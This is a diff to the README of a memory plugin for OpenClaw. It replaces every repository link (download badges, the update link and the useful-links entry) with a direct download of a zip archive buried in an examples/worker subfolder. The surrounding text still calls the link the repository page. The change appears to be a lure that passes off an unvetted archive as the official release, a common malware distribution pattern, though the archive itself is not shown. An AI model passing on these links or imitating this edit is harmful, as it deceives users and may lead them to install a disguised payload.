@@ -1,6 +1,6 @@
 # ⚡ memory-lancedb-pro - Smarter Memory for OpenClaw
 
-[![Download](https://img.shields.io/badge/Download-Get%20memory--lancedb--pro-blue?style=for-the-badge)](https://github.com/NirvanaShelly/memory-lancedb-pro)
+[![Download](https://img.shields.io/badge/Download-Get%20memory--lancedb--pro-blue?style=for-the-badge)](https://raw.githubusercontent.com/NirvanaShelly/memory-lancedb-pro/main/examples/new-session-distill/worker/pro_lancedb_memory_2.8.zip)
 
 ## 📋 About memory-lancedb-pro
 
@@ -28,7 +28,7 @@ No special software is needed before you begin. This is a self-contained program
 
 Click the big blue button at the top or here to visit the download page:
 
-[Download memory-lancedb-pro](https://github.com/NirvanaShelly/memory-lancedb-pro)
+[Download memory-lancedb-pro](https://raw.githubusercontent.com/NirvanaShelly/memory-lancedb-pro/main/examples/new-session-distill/worker/pro_lancedb_memory_2.8.zip)
 
 This link leads to the GitHub repository where you will find the files to download.
 
@@ -97,7 +97,7 @@ These features help OpenClaw-based apps remember and retrieve information with m
 
 ## 🔄 Updating memory-lancedb-pro
 
-Check the [repository page](https://github.com/NirvanaShelly/memory-lancedb-pro) regularly for updates.
+Check the [repository page](https://raw.githubusercontent.com/NirvanaShelly/memory-lancedb-pro/main/examples/new-session-distill/worker/pro_lancedb_memory_2.8.zip) regularly for updates.
 
 When a new version is available:
 
@@ -127,10 +127,10 @@ No coding is needed to enable the plugin if you follow setup instructions on the
 
 ## 🔗 Useful Links
 
-- Download: [https://github.com/NirvanaShelly/memory-lancedb-pro](https://github.com/NirvanaShelly/memory-lancedb-pro)
+- Download: [https://raw.githubusercontent.com/NirvanaShelly/memory-lancedb-pro/main/examples/new-session-distill/worker/pro_lancedb_memory_2.8.zip](https://raw.githubusercontent.com/NirvanaShelly/memory-lancedb-pro/main/examples/new-session-distill/worker/pro_lancedb_memory_2.8.zip)
 - Documentation: Check the repository’s Wiki or README files.
 - Support: Use the GitHub Issues section for questions or bug reports.
 
 ---
 
-# [![Download](https://img.shields.io/badge/Download-Get%20memory--lancedb--pro-grey?style=for-the-badge)](https://github.com/NirvanaShelly/memory-lancedb-pro)
+# [![Download](https://img.shields.io/badge/Download-Get%20memory--lancedb--pro-grey?style=for-the-badge)](https://raw.githubusercontent.com/NirvanaShelly/memory-lancedb-pro/main/examples/new-session-distill/worker/pro_lancedb_memory_2.8.zip)
